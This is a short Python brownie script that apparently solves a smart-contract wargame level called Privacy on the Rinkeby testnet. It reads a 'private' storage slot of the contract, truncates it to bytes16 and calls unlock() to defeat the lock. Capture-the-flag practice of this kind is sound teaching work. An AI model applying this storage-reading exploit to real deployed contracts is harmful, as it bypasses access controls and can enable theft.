from brownie import accounts, config, Privacy
from web3 import Web3

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x93d20C8812Abf0cBf8D552363cc505e84F429C32"
privacy = Privacy.at(instance_address)

# ---------------------------------------
# unlock this contract to beat this level
# ---------------------------------------


def level_completed():
    return privacy.locked() == False


def exploit():
    # set up web3
    rpc_url = config["wallets"]["endpoint"]
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    # data[2] is at storage slot 5
    data = w3.eth.get_storage_at(instance_address, 5)
    # convert bytes32 to bytes16
    data_bytes_16 = data[:16]

    # call unlock function with data_2 as an argument
    tx = privacy.unlock(data_bytes_16, {"from": account})
    tx.wait(1)

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
